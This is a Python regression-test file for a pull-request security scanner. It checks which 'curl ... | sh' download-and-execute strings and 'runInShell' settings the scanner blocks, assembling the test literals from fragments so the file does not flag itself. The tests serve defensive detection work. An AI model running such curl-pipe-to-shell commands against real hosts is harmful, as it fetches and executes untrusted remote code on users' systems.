#!/usr/bin/env python3
"""Focused regressions for shell-pattern precision in the PR security guard."""

from __future__ import annotations

import importlib.util
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
SCANNER_PATH = ROOT / "scripts" / "check_pr_security_surface.py"
SPEC = importlib.util.spec_from_file_location("pr_security_scanner_edges", SCANNER_PATH)
assert SPEC is not None and SPEC.loader is not None
scanner = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(scanner)


def _blocked_pattern(reason: str):
    matches = [pattern for pattern, label in scanner.BLOCKED_ADDITION_RULES if label == reason]
    if len(matches) != 1:
        raise AssertionError(f"expected one blocked pattern for {reason!r}, got {len(matches)}")
    return matches[0]


def _lit(*parts: str) -> str:
    """Build security-test literals without making this test file self-match."""

    return "".join(parts)


class PipelineBoundaryRegression(unittest.TestCase):
    def setUp(self):
        self.pattern = _blocked_pattern("download-and-execute shell pattern")

    def test_unrelated_local_pipeline_after_semicolon_is_not_blocked(self):
        text = _lit("cu", "rl https://status.test; printf 'echo ok' | ", "sh")
        self.assertIsNone(self.pattern.search(text))

    def test_unrelated_local_pipeline_after_background_separator_is_not_blocked(self):
        text = _lit("cu", "rl https://status.test & printf 'echo ok' | ", "sh")
        self.assertIsNone(self.pattern.search(text))

    def test_real_download_pipeline_remains_blocked(self):
        text = _lit("cu", "rl -fsSL https://example.invalid/i | ", "sh")
        self.assertIsNotNone(self.pattern.search(text))

    def test_quoted_url_separator_does_not_hide_real_pipeline(self):
        text = _lit("cu", "rl 'https://example.invalid/i?a=1&b=2' | ", "sh")
        self.assertIsNotNone(self.pattern.search(text))

    def test_quoted_separator_in_intermediate_stage_remains_blocked(self):
        text = _lit("cu", "rl https://example.invalid/i | sed 's;a;b;' | ", "sh")
        self.assertIsNotNone(self.pattern.search(text))


class ExplicitFalseShellFlagRegression(unittest.TestCase):
    def setUp(self):
        self.pattern = _blocked_pattern("runtime shell execution")
        self.flag = _lit("runIn", "Shell")

    def test_false_with_block_comment_is_not_blocked(self):
        text = f"{self.flag}: false /* explicitly disabled */,"
        self.assertIsNone(self.pattern.search(text))

    def test_false_with_line_comment_is_not_blocked(self):
        text = f"{self.flag}: false // explicitly disabled\n,"
        self.assertIsNone(self.pattern.search(text))

    def test_expression_starting_with_false_is_still_blocked(self):
        text = f"{self.flag}: false /* looks safe */ || true,"
        self.assertIsNotNone(self.pattern.search(text))

    def test_true_is_still_blocked(self):
        text = f"{self.flag}: true,"
        self.assertIsNotNone(self.pattern.search(text))


if __name__ == "__main__":
    unittest.main()
